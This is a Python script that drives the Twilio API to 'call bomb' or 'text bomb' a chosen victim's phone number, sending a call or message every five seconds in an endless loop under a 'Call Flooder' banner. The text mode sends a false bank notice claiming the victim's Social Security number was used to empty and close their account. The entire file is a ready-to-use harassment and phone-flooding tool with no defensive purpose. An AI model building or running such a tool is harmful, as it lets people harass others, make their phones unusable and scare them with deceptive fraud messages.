import time
from twilio.rest import Client
sid = '' #Fill in with your Twilio SID
token = '' #Fill in with your Twilio Token
client = Client(sid, token)
number = "" #Put your Twilio number here
def call(victimNumber, yourNumber):
	try:
		call = client.calls.create(
			to = victimNumber,
			from_ = yourNumber,
			url = 'http://demo.twilio.com/docs/voice.xml',
			method = "GET",
		)
		print("Started call to %s from %s" % (victimNumber, yourNumber));
	except Exception as err:
		print("Error on %s from %s: %s" % (victimNumber, yourNumber, err));
def text(victimNumber, yourNumber):
	try:
		message = client.messages \
			.create(
				body='Your bank account has been successfully closed. The social security number you used to open the account has been used to withdraw the remainder of the funds and close the account. Thank you for banking with us!', #You can change this string for a different message if you would like!
				from_ = yourNumber,
				to = victimNumber
			)
		print("Texted %s from %s" % (victimNumber, yourNumber));
	except Exception as err:
		print("Error on %s from %s: %s" % (victimNumber, yourNumber, err));
print ("""\033[94m
 _____         _  _                        
/  __ \       | || |                       
| /  \/  __ _ | || |                       
| |     / _` || || |                       
| \__/\| (_| || || |                       
 \____/ \__,_||_||_|                       
______  _                    _             
|  ___|| |                  | |            
| |_   | |  ___    ___    __| |  ___  _ __ 
|  _|  | | / _ \  / _ \  / _` | / _ \| '__|
| |    | || (_) || (_) || (_| ||  __/| |   
\_|    |_| \___/  \___/  \__,_| \___||_|   
                                           
                                           
""")
victim = input("\033[93m What number would you like to flood? +1 MUST BE IN FRONT: ")
times = 0
choice = input("\033[93m Would you like to Call or Text bomb them?: ").lower()
if choice == "call":
	while True:
		times += 1
		print("\033[92m Starting flood on %s,  %s times!" % (victim, times))
		call(victim, number)
		time.sleep(5)
elif choice == "text":
	while True:
		times +=1
		print("\033[92m Starting flood on %s, %s times!" % (victim, times))
		text(victim, number)
		time.sleep(5)

